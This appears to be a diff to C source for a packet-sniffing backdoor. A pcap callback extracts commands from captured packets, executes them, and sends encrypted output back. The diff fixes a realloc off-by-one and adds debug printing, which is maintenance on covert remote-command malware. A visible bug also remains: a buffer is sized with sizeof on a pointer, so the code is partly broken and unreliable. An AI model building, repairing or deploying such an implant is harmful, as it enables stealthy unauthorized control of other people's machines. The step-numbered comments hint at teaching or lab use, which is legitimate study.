@@ -35,7 +35,7 @@ void execute_command(const char *command, char **result)
     // grab all the lines and realloc and concat string as needed
     while (fgets(line_buffer, MAX_LINE_LEN, fp))
     {
-        *result = (char*)realloc(*result, strlen(*result) + strlen(line_buffer));
+        *result = (char*)realloc(*result, strlen(*result) + strlen(line_buffer) + 1);
         if (!*result)
         {
             return;
@@ -113,6 +113,7 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
 
     // Step 6: Execute the command
     execute_command(command, &command_output);
+    printf("Command executed:\n%s\n", command_output);
 
     // Step 7: Send the results back
     encrypted_command_output = (char*)malloc(sizeof(command_output));
